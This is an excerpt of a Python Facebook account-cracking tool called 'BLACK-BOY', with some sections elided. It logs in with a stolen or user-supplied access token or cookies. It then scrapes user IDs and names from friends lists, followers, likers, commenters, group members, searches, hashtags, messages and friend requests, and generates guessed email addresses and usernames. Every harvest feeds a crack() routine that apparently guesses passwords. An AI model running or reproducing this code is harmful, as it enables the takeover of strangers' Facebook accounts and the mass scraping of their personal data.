...
try:
    rq = requests.get('https://pastebin.com/raw/ANem45fe').text
...
def banner():
        os.system("clear")
        os.system('echo  "\n\x1b[1;91m /$$$$$$$  /$$$$$$ /$$      /$$  /$$$$$$  /$$   /$$  \n\x1b[1;91m| $$__  $$|_  $$_/| $$$    /$$$ /$$__  $$| $$$ | $$\n\x1b[1;92m| $$  \ $$  | $$  | $$$$  /$$$$| $$  \ $$| $$$$| $$\n\x1b[1;92m| $$$$$$$/  | $$  | $$ $$/$$ $$| $$  | $$| $$ $$ $$\n\x1b[1;91m| $$__  $$  | $$  | $$  $$$| $$| $$  | $$| $$  $$$$\n\x1b[1;93m| $$  \ $$  | $$  | $$\  $ | $$| $$  | $$| $$\  $$$\n\x1b[1;93m| $$  | $$ /$$$$$$| $$ \/  | $$|  $$$$$$/| $$ \  $$\n\x1b[1;97m|__/  |__/|______/|__/     |__/ \______/ |__/  \__/\n\x1b[1;97m------------------------------------------------\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : RIMON  \n \x1b[1;93m(*)\x1b[1;93m FB        : facebook.com/BlackHacker2468\n \x1b[1;93m(*)\x1b[1;95m Tool Name : BLACK-BOY\n \x1b[1;93m(*)\x1b[1;91m Github    : https://github.com/Black-Boy26\n\x1b[1;97m------------------------------------------------" | lolcat')
        print("") 
        

def cek_dev():
    _isi_dev_ = _rimon_dapunta_('cookies.txt','r').read()
...
def menu_log():
    ...
    banner()
    var_menu()
    pmu = _cici_rimon_('%s [%s•%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pmu in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = _cici_rimon_('%s [%s•%s] %sTOKEN : %s'%(H,P,H,K,H))
        try:x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];xd = _rimon_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _rimon_dapunta_('cookies.txt','w');xz.write('null');xz.close();bot_follow(token);menu()
...
def menu():
    ...
    jid = ''
    try:
        _rimon_ = _rimon_dapunta_("token.txt","r").read();_cici_ = _rimon_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
    ...
    try:token = _rimon_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
    ...
    psb('         %s》%s》%s》%sWELLCOME TO RIMON TOOL%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
    ...
    print('')
    pm = _cici_rimon_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    ...
    elif pm in ['8','08','008','h']:cek_dev();dump_grup(_salsabila_,_rimon_)
...
def defaultua():
    ua = ua_blackberry
    try:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
    except (KeyError,IOError):menu_log()


def ugen():
    var_ugen()
    pmu = _cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pmu in[""]:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_rimon_('%s [ %sBACK %s]%s'%(M,P,M,K));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt");ua = _cici_rimon_("%s [%s•%s] %sENTER USER AGENT : \n\n"%(H,P,H,K))
        try:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_rimon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
        except (KeyError,IOError):jalan("\n%s [ %sFAILED TO CHANGE USER AGENT %s]"%(Z,M,Z));print('%s '%(M));_cici_rimon_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]"%(H,P,H));print('%s '%(O));_cici_rimon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['5','05','005','e']:
        try:ungser = _rimon_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'NOT FOUND'
        print("%s [%s•%s] %sYOUR USER AGENT  : \n\n%s%s"%(H,P,H,P,O,ungser));jalan("\n%s [ %sTHIS IS YOUR CURRENT USER AGENT %s]"%(H,K,H));print('%s '%(O));_cici_rimon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
...
def ugen_hp():
    ...
    print('')
    pc = _cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pc in['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()
    elif pc in ['1','01']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_blackberry);ugent.close()
    elif pc in ['2','02']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    elif pc in ['9','09']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_iphone);ugent.close()
    elif pc in ['10','10']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_realme);ugent.close()
    elif pc in ['11','11']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_smarttv);ugent.close()
    elif pc in ['12','12']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_infinix);ugent.close()
    elif pc in ['13','13']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_tecno);ugent.close()  
    elif pc in ['14','14']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_blackberry);ugent.close() 
    elif pc in ['15','15']:ugent = _rimon_dapunta_('ugent.txt','w');ugent.write(ua_lg);ugent.close() 
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    jalan("%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_rimon_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()


def publik(token):
    jid = '5000'
    try:
        print('%s [%s•%s] %sWRITE \'me\' TO RETRIEVE FRIEND ID'%(H,P,H,K));it = _cici_rimon_("%s [%s•%s] %sTARGET ID : "%(H,P,H,K));cek_target_crack_(it)
        ...
        r = _req_get_("https://graph.facebook.com/%s/friends?limit=%s&fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=%s"%(it,jid,token));id = [];z = _js_lo_(r.text);xc = (ob["first_name"]+".json").replace(" ","_");xb = _rimon_dapunta_(xc,"w")
        for a in z["data"]:
...
def followers(cookies):
    _query_ = _cici_rimon_('%s [%s•%s] %sENTER TARGET ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    exec_followers(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_followers(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try:
...
def main_likers(_rimon_):
    _query_ = _cici_rimon_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _rimon_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_rimon_,_url_,_file_)
    if len(_rimon_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_likers(_rimon_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_rimon_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_rimon_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_rimon_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "See more" in _lanjut_.text:
                while True:
                    try:scrape_likers(_rimon_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)


def main_komen(_rimon_):
    _query_ = _cici_rimon_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _rimon_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_rimon_,_url_,_file_)
    if len(_rimon_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_komen(_rimon_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_rimon_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_rimon_dapunta_(_file_,'a+').write(str(_a_).split('&')[0]+'•'+__id__+'\n')
                    else:_a_="".join(bs4.re.findall("/(.*?)\?",_id_.get("href")));__id__ = _id_.text;_rimon_dapunta_(_file_,'a+').write(str(_a_).split('?')[0]+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "View more comments…" in _lanjut_.text:
                while True:
                    try:scrape_komen(_rimon_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
...
class dump_grup:
    def __init__(self,_rimon_,_cici_):
        self.glist=[];self._grup_=[];self.id='__rimon__.json';self.token=_cici_;self.cookies=_rimon_;self.header = {"user-agent": "Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+"};self.main_group("https://m.facebook.com/groups/?seemore")
    def main_group(self, url_dev):
        ...
        if len(self.glist) !=0:
            ...
            while True:
                c=_cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K));print('%s '%(O))
                if c=="":continue
                elif c=="1":self.saya()
    ...
    def saya(self):
        ...
        try: 
            ...
            with _req_ses_ as ses_:
                ...
                for _rimon_ in data["data"]:
                    try:self._grup_.append(_rimon_["id"])
                    except:pass
            for _cici_ in self._grup_:
                try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_rimon_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_rimon_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
        ...
        except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,K,len(_rimon_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
        ...
        with _req_ses_ as ses_:
            try:
                ...
                for dev in members.find_all("table"):
                    ...
                    try:_rimon_dapunta_(self.fl,'a+').write(str(user_)+"•"+str(nama_)+"\n").close()
                    except:pass
                print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
    ...
    def manual(self):
        id=_cici_rimon_("%s [%s•%s] %sENTER GROUP ID : "%(H,P,H,K))
        if id=="":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            ...
            if "no content" in r.find("title").text.lower():jalan('%s [%s!%s] %sPRIVATE GROUP / WRONG ID'%(M,P,M,P));menu()
                ...
                self.listed={"id":id,"name":r.find("title").text};self.f(id);print('%s '%(O));print("%s [%s•%s] %sNAME : %s"%(H,P,H,K,self.listed.get("name")));xd = _cici_rimon_('%s [%s•%s] %sDump ID/Username? [i/u] : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K))
                if xd in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
                elif xd in ['i','I','1']:
                    try:self.dump_id("https://m.facebook.com/groups/"+id);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %s"%(H,P,H,K,len(_rimon_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %s"%(H,P,H,K,len(_rimon_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:print('\n%s [%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
                elif xd in ['u','U','2']:
                    try:self.dump_username("https://m.facebook.com/groups/"+id);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_rimon_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %s"%(H,P,H,K,len(_rimon_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,M,_error_));_cici_cici_()
                else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()    
    def search(self):
        whitelist=[];q=_cici_rimon_('%s [%s•%s] %sNAME : '%(H,P,H,K)).lower()
        if q=='':self.search()
        else:
    ...
    def choice(self, whitelist,q):
        try:
            self.listed=whitelist[int(_cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K)))-int(1)];self.f(q);print('%s '%(O));print("%s [%s•%s] %sNAME : %s"%(H,P,H,K,self.listed.get("name")));xd = _cici_rimon_('%s [%s•%s] %sDUMP/USERNAME? %s[%si%s/%su%s] : '%(H,P,H,K,Z,M,Z,H,Z));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K))
            if xd in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            elif xd in ['i','I','1']:
    ...
    def f(self,id):
        ...
        _rimon_dapunta_(self.fl,"w").close()
    def dump_username(self, url):
        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
            ...
            try:
                if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
                    ...
                    if "profile.php" in ogeh.get("href"):
                        ...
                        if len(a)==0:continue
                        elif a in _rimon_dapunta_(self.fl).read():continue
                        else:_rimon_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text));continue
                    else:
...
def dump_name(_rimon_):
    print('%s [%s•%s] %sEXAMPLE : RIMON,KANHA'%(H,P,H,K));__name__ = _cici_rimon_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
    for _name_ in __name__:_url_ = "https://mbasic.facebook.com/search/people/?q="+_name_;cari_nama(_file_,_rimon_,_url_)
    _buka_file_ = _rimon_dapunta_(_file_,'r').read().splitlines();print("\n%s [%s•%s] %sTOTAL ID : %s"%(H,P,H,K,str(len(_buka_file_))))
    return crack(_file_)
def cari_nama(_file_,_cookies_,_url_):
    _rimon_dapunta_(_file_,"a+");_req_ses_dev_ = bs4.BeautifulSoup(_req_get_(_url_, cookies=_cookies_,headers=header_nama).text,"html.parser")
    for _rimon_dev_ in _req_ses_dev_.find_all("a",href=True):
        print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
        if "<img alt=" in str(_rimon_dev_):
            if "home.php" in str(_rimon_dev_["href"]):continue
            else:
                _str_dev_ = str(_rimon_dev_["href"])
                if "profile.php" in _str_dev_:
                    _name_ = _rimon_dev_.find("img").get("alt").replace(", profile picture","");_find_ = bs4.re.findall("/profile\.php\?id=(.*?)&",_str_dev_)
                    if len (_find_) !=0:
                        _user_ = "".join(_find_)
                        if _user_ in _rimon_dapunta_(_file_).read():pass
                        else:_rimon_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
                else:
                    _find_ = bs4.re.findall("/(.*?)\?",_str_dev_);_name_ = _rimon_dev_.find("img").get("alt").replace(", profile picture","")
                    if len(_find_) !=0:
                        _user_="".join(_find_)
                        if _user_ in _rimon_dapunta_(_file_).read():pass
                        else:_rimon_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
        if "See More Results" in _rimon_dev_.text:cari_nama(_file_,_cookies_,_rimon_dev_["href"])


class dump_pesan:
    def __init__(self,_cookies_,_nama_,_id_):
        self.cookies = _cookies_;self.id = _id_;self.files = (_nama_+'.json').replace(" ","_");_rimon_dapunta_(self.files,"w").close();self.dump("https://m.facebook.com/messages")
    def dump(self,url):
                ...
                try:
                    for _user_ in list(_soup_.pop()):
                        if _user_ in self.id:continue
                            ...
                            _rimon_dapunta_(self.files,"a+").write("%s•%s\n"%(_user_,_dev_.text));print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(self.files).read().splitlines())),end='');sys.stdout.flush()
                except Exception as e:continue
            if "See Older Messages" in _dev_.text:self.dump("https://m.facebook.com/"+_dev_.get("href"))
        _buka_file_ = _rimon_dapunta_(self.files,'r').read().splitlines();print("\n%s [%s•%s] %sTOTAL ID : %s"%(H,P,H,K,str(len(_buka_file_))))
...
def dump_email():
    print("%s [%s•%s] %sEXAMPLE : RIMONkanha "%(H,P,H,K));_query_ = _cici_rimon_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
    if len(_query_) < 3:jalan('%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITS'%(M,P,M,P));time.sleep(2);menu()
    print("%s [%s•%s] %sEXAMPLE : %sgmail.com"%(H,P,H,K,H));_domain_ = _cici_rimon_("%s [%s•%s] %sENTER DOMAIN : "%(H,P,H,K)).lower()
    if '@' in _domain_:_domain_ = _domain_.split('@')[1]
    _limit_awal_ = int(_cici_rimon_("%s [%s•%s] %sENTER STARING NUMBER : "%(H,P,H,K)));_limit_akhir_= int(_cici_rimon_("%s [%s•%s] %sENTER ENDING NUMBER : "%(H,P,H,K)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
...
def exec_email(__query__,_domain_,_limit_awal_,_limit_akhir_,_file_):
    ...
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s@%s'%(_query_1_,str(_hitung_email_1_),_domain_));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_2_;email = ('%s%s@%s'%(_query_2_,str(_hitung_email_2_),_domain_));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s@%s'%(_query_3_,str(_hitung_email_3_),_domain_));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                ...
                email = ('%s%s@%s'%(_query_,str(_hitung_email_full_),_domain_));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:
        jalan('%s [%s!%s] %sTHERE IS AN ERROR'%(M,P,M,M))
        time.sleep(2)
        menu()
    _buka_file_ = _rimon_dapunta_(_file_,'r').read().splitlines()
    print("%s [%s•%s] %sTOTAL ID : %s%s"%(H,P,H,K,H,str(len(_buka_file_))))
    return crack(_file_)


def dump_username():
    print("%s [%s•%s] %sEXAMPLE : %sRIMON KHAN"%(H,P,H,K,H));_query_ = _cici_rimon_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
    if len(_query_) < 3:jalan('%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITS'%(M,P,M,M));time.sleep(2);menu()
    _limit_awal_ = int(_cici_rimon_("%s [%s•%s] %sENTER STARTING NUMBER (EX: 1) : "%(H,P,H,P)));_limit_akhir_= int(_cici_rimon_("%s [%s•%s] %sENTER ENDING NUMBER (EX: 1000): "%(H,P,H,P)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
...
def exec_username(__query__,_limit_awal_,_limit_akhir_,_file_):
    ...
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s'%(_query_1_,str(_hitung_email_1_)));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_2_;email = ('%s%s'%(_query_2_,str(_hitung_email_2_)));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s'%(_query_3_,str(_hitung_email_3_)));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
                ...
                email = ('%s%s'%(_query_,str(_hitung_email_full_)));_rimon_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:jalan('%s [%s!%s] %sTHERE IS AN ERROR'%(M,P,M,P));time.sleep(2);menu()
    _buka_file_ = _rimon_dapunta_(_file_,'r').read().splitlines();print("%s [%s•%s] %sTOTAL ID : %s%s"%(H,P,H,K,H,str(len(_buka_file_))))
    return crack(_file_)

### Dump ID From Hashtag
def hashtag(cookies):
    _query_ = _cici_rimon_('%s [%s•%s] %sENTER HASHTAG : '%(H,P,H,B));_url_dev_ = 'https://mbasic.facebook.com/hashtag/' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
...
def exec_hashtag(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_hashtag);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            for _rimon_ in _cici_.find_all('a',href=True):
                if 'mbasic.facebook.com' in _rimon_.get('href'):pass
                else:
                    if "profile.php" in _rimon_.get('href'):
                        try:
                            _name_dev_ = _rimon_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_rimon_.get("href")))
                            if _name_dev_ in _buka_file_:pass
                            elif '/' in _id_dev_:pass
                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                        except:pass
                        ...
                        try:
                            _name_dev_ = _rimon_.text;_id_dev_ = "".join(bs4.re.findall("/(.*?)\?",_rimon_.get("href")))
                            if _name_dev_ in _buka_file_:pass
                            elif '/' in _id_dev_:pass
                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                        except:pass
            for _rimon_ in _sop_dev_.find_all('a',href=True):
                if 'See More Results' in _rimon_.text:url_dev = _rimon_.get('href');exec_hashtag(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)
...
def exec_beranda(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            for _rimon_ in _cici_.find_all('a',href=True):
                if "profile.php" in _rimon_.get('href'):
            ...
            for _rimon_ in _sop_dev_.find_all('a',href=True):
                if 'See More Stories' in _rimon_.text:url_dev = 'https://mbasic.facebook.com/' + _rimon_.get('href');exec_beranda(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)
...
def exec_permintaan_pertemanan_masuk(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_rimon_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _rimon_ in _sop_dev_.find_all('a',href=True):
            if '/friends/hovercard' in _rimon_.get('href'):
                try:_name_dev_ = _rimon_.text;_id_dev_ = "".join(bs4.re.findall('uid=(.*?)&',_rimon_.get('href')));open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _rimon_ in _sop_dev_.find_all('a',href=True):
            if 'See More' in _rimon_.text:url_dev = 'https://mbasic.facebook.com/' + _rimon_.get('href');exec_permintaan_pertemanan_masuk(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)
...
def exec_permintaan_pertemanan_keluar(url,cookies,_file_):
    ...
    try:
        ...
        for _rimon_ in _sop_dev_.find_all('a',href=True):
            if 'See More' in _rimon_.text:url_dev = 'https://mbasic.facebook.com/' + _rimon_.get('href');exec_permintaan_pertemanan_keluar(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_rimon_dapunta_(_file_).read().splitlines())));return crack(_file_)
    ...
    try:
        ...
        if _id_ in _cek_:
            if _id_ == 'me':pass
                ...
